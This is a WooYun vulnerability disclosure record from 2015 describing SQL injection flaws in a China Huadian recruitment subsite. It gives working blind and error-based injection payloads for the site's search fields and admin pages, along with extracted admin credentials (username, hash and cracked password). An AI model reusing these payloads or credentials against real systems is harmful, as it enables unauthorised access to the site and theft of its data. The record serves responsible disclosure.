{"id": 66528, "wybug_id": "wooyun-2015-0137911", "wybug_title": "中国华电集团某分站前后台SQL注入漏洞打包", "wybug_corp": "chd.com.cn", "wybug_author": "二愣子", "wybug_date": "2015-09-12 23:16", "wybug_open_date": "2015-10-30 08:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向公众公开  简要描述： 烟抽完、就睡觉 详细说明：  手工测试，需要关闭JS执行引擎1、注入点：http://zhaopin.chd.com.cn/hr/jobsinfo.jspPOST：iddcJobTypeID=&iddcRegionID=&iddcEducationID=&txtKeyWord=%B9%A4%25%27&btnSumbit=%CB%D1+%CB%F7注入点就在这个txtKeyWord参数上在关键字搜索的地方进行手工注入测试\n工%'and 1=1 and '%'='工%'and 1=2 and '%'='两个界面明显返回结果不一样\n获取数据库信息\n工%'and user() like 'a%' and '%'='工%'and user() like 'ad%' and '%'='......工%'and user() = 'admin@localhost' and '%'='用户名为admin@localhost\n搜索框的最大长度限制是50，改一改就可以注入获得其它数据\n工%'and (select schema_name from information_schema.schemata limit 1,1) ='hr_accept_sys' and '%'='数据库名为:hr_accept_sys\n省去中间繁琐的过程。。。管理员表为：admin用户名及密码字段为:AdminName/AdminPwd\n工%'and (select AdminName from admin limit 0,1) ='hdadmin' and '%'='工%'and (select AdminPwd from admin limit 0,1) ='74D839D98630E280DF752E8939454A6B' and '%'='解密之后为admin\n2、注入结果数据库名:hr_accept_sys管理员表名:admin管理员表用户名以及密码字段:AdminName/AdminPwd管理员用户名以及密码：hdadmin/admin3、后台地址是:http://zhaopin.chd.com.cn/admin/可以进入后台盲注怎么证明呢，sqlmap不能跑啊工%'and 1=1 and '%'='\n\n工%'and 1=2 and '%'='\n\n二者明显显示的结果不一样嘛下面的截图就重复了，就没上太多了\n\n这里修改一下最大长度工%'and (select AdminName from admin limit 0,1) ='hdadmin' and '%'='工%'and (select AdminPwd from admin limit 0,1) ='74D839D98630E280DF752E8939454A6B' and '%'='下面的截图就真的重复了，所以没怎么截图了。。。。。。。。。。。\n\n\n\n   漏洞证明：  华丽的分割线 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~http://wooyun.org/bugs/wooyun-2015-0137911/trace/2550c217652cf691ff07835930e0434a用户名及密码hdadminadmin第一个注入点:http://zhaopin.chd.com.cn/admin/displayresume.jsp?id=200id字段存在报错注入payload:\nhttp://zhaopin.chd.com.cn/admin/displayresume.jsp?id=200 and (select 1 from(select count(*),concat((user()),floor(rand(0)*2))x from information_schema.tables group by x)a)\n第二个注入点:http://zhaopin.chd.com.cn/admin/PersonInfo.jsp这里有个搜索框\n分别输入下面内容，返回结果明显不一样a%' and 1=1 and '%'='a%' and 1=2 and '%'='\n具体注入细节参照上一个漏洞\nadmin%' and user()='admin@localhost' and '%'='\n华丽的分割线 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~需要登录http://wooyun.org/bugs/wooyun-2015-0137911/trace/2550c217652cf691ff07835930e0434ahttp://wooyun.org/bugs/wooyun-2015-0137914/trace/b338bddf47170ccb8c1ae53fa3b68ab3用户名及密码hdadminadmin注入页面:http://zhaopin.chd.com.cn/admin/RecruitInfoQuery.jsphttp://zhaopin.chd.com.cn/admin/EditAnnouncement.jsphttp://zhaopin.chd.com.cn/admin/Org.jsp这三个页面都有一个搜索框，搜索框存在盲注第一处;\n中国%'and 1=1 and '%'='中国%'and 1=2 and '%'='中国%'and user()='admin@localhost' and '%'='\n第二处\n系统%'and 1=1 and '%'='系统%'and 1=2 and '%'='系统%'and user()='admin@localhost' and '%'='\n第三处\n江苏%'and 1=1 and '%'='江苏%'and 1=2 and '%'='江苏%'and user()='admin@localhost' and '%'='\n   修复方案：  过滤   版权声明：转载请注明来源 二愣子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-09-15 08:15 厂商回复：     CNVD确认并复现所述情况,已经转由CNCERT向能源行业信息化主管部门通报,由其后续协调网站管理单位处置.按多个风险点评分,rank 14  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}